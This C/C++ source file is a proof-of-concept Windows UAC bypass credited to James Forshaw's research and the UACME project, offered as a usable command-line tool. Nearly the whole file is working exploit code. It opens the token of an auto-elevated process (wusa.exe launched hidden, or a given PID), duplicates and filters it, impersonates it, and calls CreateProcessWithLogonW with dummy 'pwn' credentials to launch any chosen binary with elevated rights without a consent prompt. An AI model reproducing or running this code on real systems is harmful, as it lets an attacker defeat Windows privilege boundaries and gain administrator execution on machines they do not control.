/*
 * PoC - UAC bypass technique by James Forshaw
 * https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html
 * https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html
 * https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html
 * Credits - reference implementation code: 
 * https://github.com/hfiref0x/UACME/blob/master/Source/Akagi/methods/tyranid.c
 */
#include <Windows.h>
#include <stdio.h>
#include <tchar.h>

#pragma comment(lib, "ntdll.lib")

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }
#endif

#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL 0xC0000001
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define NtCurrentThread() ( (HANDLE)(LONG_PTR) -2 )

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING;

typedef UNICODE_STRING *PUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;

typedef enum _THREADINFOCLASS {
	ThreadBasicInformation,
	ThreadTimes,
	ThreadPriority,
	ThreadBasePriority,
	ThreadAffinityMask,
	ThreadImpersonationToken,
	ThreadDescriptorTableEntry,
	ThreadEnableAlignmentFaultFixup,
	ThreadEventPair,
	ThreadQuerySetWin32StartAddress,
	ThreadZeroTlsCell,
	ThreadPerformanceCount,
	ThreadAmILastThread,
	ThreadIdealProcessor,
	ThreadPriorityBoost,
	ThreadSetTlsArrayAddress,
	ThreadIsIoPending,
	ThreadHideFromDebugger,
	ThreadBreakOnTermination,
	ThreadSwitchLegacyState,
	ThreadIsTerminated,
	ThreadLastSystemCall,
	ThreadIoPriority,
	ThreadCycleTime,
	ThreadPagePriority,
	ThreadActualBasePriority,
	ThreadTebInformation,
	ThreadCSwitchMon,
	ThreadCSwitchPmu,
	ThreadWow64Context,
	ThreadGroupInformation,
	ThreadUmsInformation,
	ThreadCounterProfiling,
	ThreadIdealProcessorEx,
	ThreadCpuAccountingInformation,
	ThreadSuspendCount,
	ThreadHeterogeneousCpuPolicy,
	ThreadContainerId,
	ThreadNameInformation,
	ThreadProperty,
	ThreadSelectedCpuSets,
	ThreadSystemThreadInformation,
	MaxThreadInfoClass
} THREADINFOCLASS;

extern "C" NTSTATUS NTAPI NtSetInformationToken(HANDLE, TOKEN_INFORMATION_CLASS, PVOID, ULONG);
extern "C" NTSTATUS NTAPI NtFilterToken(HANDLE, ULONG, PTOKEN_GROUPS, PTOKEN_PRIVILEGES, PTOKEN_GROUPS, PHANDLE);
extern "C" NTSTATUS NTAPI NtDuplicateToken(HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, BOOLEAN, TOKEN_TYPE, PHANDLE);
extern "C" NTSTATUS NTAPI NtSetInformationThread(HANDLE, THREADINFOCLASS, PVOID, ULONG);
extern "C" NTSTATUS NTAPI RtlAllocateAndInitializeSid(PSID_IDENTIFIER_AUTHORITY, UCHAR, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, ULONG, PSID);
extern "C" ULONG NTAPI RtlLengthSid(PSID);
extern "C" ULONG NTAPI RtlNtStatusToDosError(NTSTATUS);

BOOL isElevated(HANDLE hProcess) 
{
	BOOL fReturn = FALSE;
	HANDLE hToken = NULL;
	
	if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) 
	{
		TOKEN_ELEVATION Elevation;
		DWORD dwSize = sizeof(TOKEN_ELEVATION);

		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &dwSize)) 
			fReturn = Elevation.TokenIsElevated;
	}
	if (hToken)
		CloseHandle(hToken);

	return fReturn;
}

VOID displayHelp()
{
	wprintf(TEXT("Usage: uac [-p <pid>] <binary to run>\n\n"));
	wprintf(L"Options:\n");
	wprintf(L"  -p <pid>\t\t\tProcess ID of an elevated process\n");
}

DWORD wmain(DWORD argc, wchar_t* argv[])
{
	DWORD dwProcessId = 0;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	SHELLEXECUTEINFO ShExecInfo = { 0 };
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	HANDLE hProcess;
	wchar_t *EXE_NAME = TEXT("wusa.exe");
	wchar_t *strBinName;
	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;

	if (argc != 2 && argc != 4)
	{
		displayHelp();
		return 0;
	}

	if (_wcsicmp(argv[1], TEXT("-p")) == 0)
	{
		dwProcessId = _wtoi(argv[2]);
		strBinName = (wchar_t *)malloc((wcslen(argv[3]) + 1) * sizeof(wchar_t));
		strBinName = argv[3];
	}
	else
	{
		strBinName = (wchar_t *)malloc((wcslen(argv[1]) + 1) * sizeof(wchar_t));
		strBinName = argv[1];
	}

	// USE AUTOELEVATED PROCESS
	if (dwProcessId)
	{
		hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId);
		if (hProcess == NULL)
		{
			wprintf(TEXT("[-] Error: Could not open process for PID (%d).\n"), dwProcessId);
			return 1;
		}

		if (isElevated(hProcess))
			wprintf(TEXT("[+] Process is elevated. Continuing...\n"));
		else
		{
			wprintf(TEXT("[-] Process is not elevated. Aborting.\n"));
			goto cleanup;
		}
	}
	else
	{
		// RUN AUTOELEVATED APP (WUSA.EXE)
		ShExecInfo.cbSize = sizeof(ShExecInfo);
		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		ShExecInfo.lpFile = EXE_NAME;
		ShExecInfo.nShow = SW_HIDE;
	
		if (!ShellExecuteEx(&ShExecInfo))
		{
#ifdef _DEBUG
			wprintf(TEXT("[-] Failed to start wusa.exe\n"));
#endif
			return 1;
		}

		hProcess = ShExecInfo.hProcess;
	}

	// OPEN ELEVATED PROCESS TOKEN
	HANDLE hToken = NULL;
	Status = OpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken);
	if (!NT_SUCCESS(Status))
	{
#ifdef _DEBUG
		wprintf(TEXT("[-] OpenProcessToken failed\n"));
#endif		
		goto cleanup;
	}

	// WE DONT NEED WUSA.EXE ANYMORE
	if(!dwProcessId)
		TerminateProcess(hProcess, 0);

	// DUPLICATE PRIMARY TOKEN
	SECURITY_QUALITY_OF_SERVICE sqos;
	OBJECT_ATTRIBUTES obja;
	sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
	sqos.ImpersonationLevel = SecurityImpersonation;
	sqos.ContextTrackingMode = 0;
	sqos.EffectiveOnly = FALSE;
	InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
	obja.SecurityQualityOfService = &sqos;
	HANDLE hNewToken = NULL;

	Status = NtDuplicateToken(hToken, TOKEN_ALL_ACCESS, &obja, FALSE, TokenPrimary, &hNewToken);
	if (!NT_SUCCESS(Status))
	{
#ifdef _DEBUG
		wprintf(TEXT("[-] NtDuplicateToken failed\n"));
#endif
		CloseHandle(hNewToken);
		goto cleanup;
	}
	
	// INITIALIZE SID
	PSID pSID = NULL;
	Status = RtlAllocateAndInitializeSid(&ntAuthority, 1, SECURITY_MANDATORY_MEDIUM_RID, 0, 0, 0, 0, 0, 0, 0, &pSID);
	if (!NT_SUCCESS(Status))
	{
#ifdef _DEBUG
		wprintf(TEXT("[-] RtlAllocateAndInitializeSid failed\n"));
#endif
		goto cleanup;
	}

	// LOWER DUPLICATED TOKEN IL FROM HIGH TO MEDIUM
	TOKEN_MANDATORY_LABEL tml;
	tml.Label.Attributes = SE_GROUP_INTEGRITY;
	tml.Label.Sid = pSID;

	Status = NtSetInformationToken(hNewToken, TokenIntegrityLevel, &tml, (ULONG)(sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pSID)));
	if (!NT_SUCCESS(Status))
	{
#ifdef _DEBUG
		wprintf(TEXT("[-] NtSetInformationToken failed\n"));
#endif
		goto cleanup;
	}

	// CREATE RESTRICTED TOKEN
	HANDLE LUAToken = NULL;	
	Status = NtFilterToken(hNewToken, LUA_TOKEN, NULL, NULL, NULL, &LUAToken);
	if (!NT_SUCCESS(Status))
	{
#ifdef _DEBUG
		wprintf(TEXT("[-] NtFilterToken failed\n"));
#endif
		CloseHandle(LUAToken);
		goto cleanup;
	}

	// IMPERSONATE LOGGED ON USER
	// DUPLICATE RESTRICTED TOKEN
	Status = NtDuplicateToken(LUAToken, TOKEN_IMPERSONATE | TOKEN_QUERY, &obja, FALSE, TokenImpersonation, &hNewToken);
	if (!NT_SUCCESS(Status))
	{
#ifdef _DEBUG
		wprintf(TEXT("[-] NtDuplicateToken failed\n"));
#endif
		goto cleanup;
	}

	Status = NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &hNewToken, sizeof(HANDLE));
	if (!NT_SUCCESS(Status))
	{
#ifdef _DEBUG
		wprintf(TEXT("[-] NtSetInformationThread failed\n"));
#endif
		goto cleanup;
	}

	BOOL bResult = CreateProcessWithLogonW(TEXT("pwn"), TEXT("pwn"), TEXT("pwn"), LOGON_NETCREDENTIALS_ONLY, strBinName, NULL, CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi);

	if (bResult) {
		if (pi.hThread) 
			CloseHandle(pi.hThread);
		if (pi.hProcess) 
			CloseHandle(pi.hProcess);
	}
	else
	{
#ifdef _DEBUG
		wprintf(L"[-] CreateProcessWithLogonW failed!\n");
#endif	
		goto cleanup;
	}

	return 0;

cleanup:
	if(hProcess)
		CloseHandle(hProcess);
	if(hToken)
		CloseHandle(hToken);
	return RtlNtStatusToDosError(Status);
}
